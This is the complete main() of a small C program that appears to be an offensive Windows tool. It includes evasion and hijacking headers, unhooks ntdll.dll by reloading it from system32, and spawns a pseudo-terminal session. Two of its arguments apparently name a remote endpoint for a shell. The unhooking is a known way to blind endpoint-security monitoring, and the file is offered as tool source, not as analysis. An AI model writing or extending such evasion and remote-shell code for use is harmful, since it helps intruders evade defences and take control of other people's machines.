#include "globals.h"
#include "evasion.h"
#include "hijacking.h"
#include "spawn.h"

int main(int argc, char* argv[])
{
    g_hStdIn = GetStdHandle(STD_INPUT_HANDLE);
    g_hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hStdErr = GetStdHandle(STD_ERROR_HANDLE);
    int iRes = -1;
    if (argc == 6)
    {
        int iRows = atoi(argv[2]);
        int iCols = atoi(argv[3]);
        UnHookDll(_T("ntdll.dll"), _T("c:\\windows\\system32\\ntdll.dll"));
        iRes = SUCCEEDED(SpawnPty(argv[1], iRows, iCols, argv[4], argv[5])) ? 0 : -1;
        CleanUp();
    }
    return iRes;
}


